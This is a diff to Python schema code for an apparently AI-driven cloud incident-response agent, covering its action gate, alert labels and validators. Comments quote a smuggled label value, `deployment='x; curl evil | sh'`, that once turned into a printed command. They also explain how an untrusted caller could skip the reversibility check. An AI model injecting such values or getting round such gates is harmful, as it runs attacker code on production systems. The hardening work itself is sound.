@@ -50,8 +50,8 @@ def _quote(text: str) -> str:
 
 
 ModelText = Annotated[str, AfterValidator(inert)]
-# The model's prose - what a person reads as its reasoning - also goes through G4 (gate.withhold_commands,
-# 2026-10-16): a write command in it is withheld. Not ids and targets: a target holding a command must still reach
+# The model's prose - what a person reads as its reasoning - also goes through G4 (gate.withhold_commands):
+# a write command in it is withheld. Not ids and targets: a target holding a command must still reach
 # grounding.target_problem as written, which refuses it outright.
 ModelProse = Annotated[str, AfterValidator(inert), AfterValidator(withhold_commands)]
 Quote = Annotated[str, AfterValidator(_quote)]
@@ -65,8 +65,8 @@ class Severity(str, Enum):
 
 
 # ⛔ LABELS ARE NAMES, NOT TEXT. Label values reach catalogue plan parameters, the
-# P14 resource inventory, the stack backend's line prefixes, and which resources are read (until
-# 2026-10-16 also shell commands the report told a person to paste). Prometheus alert labels inherit
+# P14 resource inventory, the stack backend's line prefixes, and which resources are read (never a shell
+# command for a person to paste). Prometheus alert labels inherit
 # series labels, which an application can export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
 # command, and `ecs_service='svc --prof admin'` an approved one. A value that is not a plain
 # identifier (or a comma list of them, or a k=v selector) is dropped here, before anything reads
@@ -84,7 +84,7 @@ RESOURCE_LABELS = frozenset({
     "dynamodb_table", "ecs_cluster", "ecs_service", "eks_cluster", "elasticache", "eventbridge_rule", "event_bus", "eventbridge_subscriber",
     "instance_id", "lambda", "log_group", "log_stream_prefix", "namespace", "region", "secret", "selector",
     "sns_topic", "sqs",
-    # What an alarm watches, for every main AWS service (resources.py, G9-A1 2026-10-10).
+    # What an alarm watches, for every main AWS service (resources.py, G9-A1).
     "lambda_qualifier", "k8s_service", "canary", "docdb_cluster", "docdb_instance", "mq_broker",
     "elasticache_serverless", "appsync_events", "asg", "ebs_volume", "efs", "fsx", "rds_instance", "elasticache_node", "memorydb",
     "schedule_group", "state_machine", "kinesis_stream", "firehose", "msk_cluster", "apigw_id", "apigw_rest",
@@ -111,7 +111,7 @@ def ingestion_wait(started_at: str, now: datetime) -> timedelta:
     return min(max(started + LOG_INGEST_LAG - now, timedelta(0)), LOG_INGEST_LAG)
 
 
-# Research 2026-10-15, item 3 (owner: "5 to 20 minutes of delay"): a read that came back empty right after the
+# Sources can lag by 5 to 20 minutes: a read that came back empty right after the
 # alert may only be early - CloudWatch's 5-minute metrics, Datadog's and Grafana's ingestion (measured on fs-22: logs
 # +1.0 min, the monitor +2.6 min). Such an incident reads once more, when the alert is REREAD_AT old (never sooner
 # than REREAD_MIN from now); an alert older than REREAD_WITHIN at its first read is not waited for again.
@@ -153,9 +153,9 @@ class Alert(BaseModel):
     service: str = Field(pattern=NAME_PATTERN)
     # A free string, resolved against the per-environment policy (environments.py). Not a fixed
     # Literal because the set of environments is a deployment concern an operator configures
-    # (dev and prod, 2026-10-16). An environment the policy doesn't know
+    # (dev and prod by default). An environment the policy doesn't know
     # resolves to the restrictive default and fails closed, so widening this cannot loosen safety.
-    # ⛔ Audit A-C-13: the environment went into the prompt and every report unchecked. It is a
+    # ⛔ The environment goes into the prompt and every report, so it is checked. It is a
     # name like any other resource name, so it is held to the same pattern.
     environment: str = Field(pattern=NAME_PATTERN)
     # Free text written by whoever configured the alert rule - UNTRUSTED. Rendered
@@ -204,8 +204,8 @@ class ContextBundle(BaseModel):
     # model, never evidence - no item id a citation can name, scanned by the tripwire as outside text.
     references: list[str] = Field(default_factory=list)
     # The resources the alert names (its resource labels' values, set where the alert is redacted): a structured
-    # line that holds one whole is not demoted for a steering stem inside it - `refund-approval` (G10 held-out set,
-    # 2026-10-10). Carried in the context so every reading of it assigns the same item ids.
+    # line that holds one whole is not demoted for a steering stem inside it - `refund-approval`. Carried in the context
+    # so every reading of it assigns the same item ids.
     resource_names: list[str] = Field(default_factory=list)
 
     def is_empty(self) -> bool:
@@ -325,7 +325,7 @@ class ActionKind(str, Enum):
     # reversible database write WARDEN performs — kills the connection, never the data. Not auto-safe
     # (touches a running DB); it goes through the full gate like every other real action.
     terminate_connections = "terminate_connections"
-    # G9-D: the generic fix classes every main AWS service shares (owner decision: all reversible ones may
+    # G9-D: the generic fix classes every main AWS service shares (all reversible ones may
     # run after a signed approval). Each is advice until a catalogue entry carries it out on the labelled resource.
     revert_config = "revert_config"        # a configuration or feature flag back to its previous deployed version
     pause_flow = "pause_flow"              # stop a consumer or a trigger that is causing harm (messages wait)
@@ -336,7 +336,7 @@ class ActionKind(str, Enum):
     raise_limit = "raise_limit"            # raise a throttle or reservation inside the account's own limit, bounded
     freeze_changes = "freeze_changes"      # stop further deploys reaching the service while a person looks
     # G10-D: undo ONE configuration change CloudTrail recorded shortly before the alarm, back to the state
-    # AWS recorded before it - most outages follow a change (research 2026-10-10). Only families a catalogue entry
+    # AWS recorded before it - most outages follow a change. Only families a catalogue entry
     # carries out; IAM and resource policies stay a person's.
     revert_change = "revert_change"
     no_action = "no_action"
@@ -351,10 +351,10 @@ BLAST_RADIUS_ORDER: tuple[str, ...] = get_args(BlastRadius)
 
 # ⛔ THE GATE'S FACTS ABOUT ITS OWN ACTIONS: (reversible, narrowest honest blast radius).
 #
-# Reversibility is a property of the OPERATION, not an opinion about an incident — and until
-# 2026-09-12 the verifier read it from a field the MODEL wrote. Two live models then reported
+# Reversibility is a property of the OPERATION, not an opinion about an incident — and the
+# verifier once read it from a field the MODEL wrote. Two live models then reported
 # opposite values for the identical operation, so the same action was rejected by P2 in one run and
-# merely escalated in another (the live-model run of 2026-09-06). Worse, `mcp_server.py` builds
+# merely escalated in another. Worse, `mcp_server.py` builds
 # a proposal from untrusted caller arguments, so any client could skip P2 by claiming
 # `reversible: true`. P2 now reads this table and nothing else.
 #
